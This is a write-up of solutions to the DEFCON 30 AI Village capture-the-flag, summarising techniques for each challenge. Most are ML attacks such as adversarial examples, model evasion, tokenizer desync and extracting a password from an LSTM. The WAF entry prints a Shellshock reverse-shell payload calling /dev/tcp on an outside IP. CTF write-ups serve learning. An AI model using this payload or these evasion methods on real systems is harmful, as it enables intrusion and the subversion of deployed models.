# AI-Village-CTF-DEFCON30-solution
Solution for the AI-themed CTF held as part of DEFCON 30 using the Kaggle platform (https://www.kaggle.com/competitions/ai-village-ctf/leaderboard).

- Hotdog: Submitted a picture of a hotdog.

- Math_1-4: Brute forced by guessing the upper and lower bounds of the expected solutions.

- Honor Student: Solved via hill-climbing by incrementally adding noise.

- Wifi: Obtained the flag by using argmin(embeddings) as character indexes.

- Bad to Good: Found that negative demerits were not properly handled and that did the trick.

- Baseball: Solved via hill-climbing after guessing the distribution for that player through grid search.

- Inference: The hint in the challenge description gave it away. Since I knew the number of characters just had to try difference combinations until D3FC0N showed up as accepted.

- Leakage: Passed the username as input to the LSTM which returned the password.

- Forensics: The flag was in the model itself which could be accessed via model.summary().

- Token: This was a tokenizer desync attack. Replacing BLANK was the solution.

- Deepfake: Submitted random videos from YouTube until found one that was accepted as valid.

- Murderbots: Identified power and temperature values via anomaly detection (deviations from the mean) that were likely human related. That gave me 9 indexes and just had to guess the last one manually.

- Hotterdog/Theft/Salt: Generated adversarial examples with the provided models using FGS.

- Crop_1: Generated the solution image via hill-climbing:
<img src="https://blogger.googleusercontent.com/img/a/AVvXsEha2PLS7PvGRFfO8LIFnw_1hCSNkud-gLUvc1caZS7OaKj_erR-8wRcoPWXCVuSDmHmPlzg3BSV6x-kthjUSSO1XBPmvnnVjDdtlryOGgA4eMgUB6oaSUWOy1aryvI8Dwj6porbcXAskjTwXclhemZR9HwHNLPfCbeJFcjXxLtXYBgM6VOBejQn7PYC">

- WAF: The hints led me to a well known exploit used by Crypto mining campaigns. Then it was all trial and error to figure out which portions were deemed as malicious. The final step involved obfuscating the b64 with spaces.
() { :;}; /bin/bash -c "bash -i >& /dev/tcp/27.1.1.1/9000 0<&1

- Secret Sloth: Could not solve this one, although I was pretty close and located the exact place where the flag was and decoded some of the letters. It could have been solved via brute force as some participants shared later :(
<img src="https://blogger.googleusercontent.com/img/a/AVvXsEjvuhYcRXAWZOQzvSJ9dQYzuCLqhieYlMU7ANajhtir7jcksbbaYZ1hObPPgqdgIYWuz_cOwe-2HgI4ue61tNGcibZo6fmI7UlwEvuYtspdC4dPhazRbpeXSx_kgR35qdvDZdZzRgiq1wzbQZY1hQXDjdQIUZcNpmBvj0W07tpu-CnuH53JIBJUR9rC">
